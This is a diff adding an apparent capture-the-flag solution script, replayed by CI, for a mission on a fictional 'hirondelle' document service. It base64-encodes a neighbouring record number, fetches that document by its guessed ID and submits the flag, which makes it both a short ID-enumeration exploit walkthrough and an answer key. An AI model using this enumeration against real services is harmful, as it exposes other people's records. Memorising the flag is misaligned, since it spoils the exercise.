@@ -1,0 +1,6 @@
+# Case file 10, mission 2: the shortest path, replayed by CI in every language.
+cat mandate/HR-2027-010.txt
+echo -n 000048207 | base64
+curl https://docs.hirondelle.test/d/MDAwMDQ4MjA3
+submit FLAG{hirondelle-un-numero-plus-loin-5d1b}
+answer check
